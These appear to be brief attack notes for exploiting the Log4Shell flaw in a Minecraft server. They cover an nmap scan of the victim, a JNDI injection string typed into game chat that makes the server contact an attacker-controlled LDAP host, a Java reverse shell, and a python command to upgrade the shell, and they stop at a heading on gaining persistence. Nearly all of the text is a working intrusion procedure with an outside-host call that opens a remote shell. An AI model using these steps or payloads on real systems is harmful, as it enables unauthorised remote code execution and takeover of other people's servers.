Run nmap -sV -O -p- victims_IP
From kali open a minecraft instance and direct connect to the victims server. 
Once connected, open up chat box in minecraft instance "t" and type the injection command: ${jndi:ldap://Attacker_IP:1389/Log4jRCE}
Victim machine connects to our LDAP server we created and refers us to the locally hosted webserver that is hosting the java program with the reverse shell and 
initiates a connection with our attacker. 

We create a fancy shell after our connection by running:
python3 -c 'import pty; pty.spawn("/bin/bash")'

Next step is gaining persistence
